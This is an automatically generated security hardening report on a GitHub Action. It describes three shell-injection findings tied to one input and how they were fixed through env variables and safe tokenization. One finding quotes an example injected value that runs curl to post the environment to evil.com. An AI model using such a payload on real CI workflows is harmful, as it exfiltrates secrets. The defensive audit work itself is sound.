<!-- markdownlint-disable -->

# Hardening Report: freckle--stack-action--generate-matrix/v5.7.27

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **freckle--stack-action--generate-matrix/v5.7.27** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (a) violation: The expression `${{ inputs.find-options }}` is directly interpolated into the `run:` shell command on line 26: `find ${{ inputs.find-options }} -printf "%f"\n`. Because GitHub Actions substitutes the expression value into the shell script string before the shell executes it, an attacker who controls the `find-options` input can inject arbitrary shell commands (e.g., by supplying a value like `. ; curl -X POST https://evil.com -d "$(env)" ;`). The value must be passed via an `env:` variable and double-quoted in the shell instead.

Locations:

- `action.yml:26`

### github-env-injection (severity: high)

The `run:` block writes output derived from the untrusted input `${{ inputs.find-options }}` directly into `$GITHUB_OUTPUT` (line 28) via a heredoc, without applying the required sanitization step (`printf '%s' ... | tr -d '\n\r'`). A value containing newline characters could break out of the heredoc or inject additional key=value pairs into `$GITHUB_OUTPUT`, potentially poisoning downstream steps that consume the `stack-yamls` output.

Locations:

- `action.yml:26`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.find-options }}" appears directly in run: block of step "Generate"; move to env: map

Locations:

- `action.yml:26`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection, static-inline-injection

**Notes:**

Moved `${{ inputs.find-options }}` from the `run:` shell string into an `env:` block as `FIND_OPTIONS`. In the shell script, used xargs-based tokenization (with a NUL-delimited read loop and process substitution) to safely split the argument list into a bash array `find_opts`, then expanded it as `"${find_opts[@]}"` in the `find` call. This prevents shell injection while correctly handling quoted arguments like `-name 'stack*.yaml'` in the find-options input. The `if [ -n "$FIND_OPTIONS" ]` guard prevents xargs from emitting an empty token when the variable is empty.

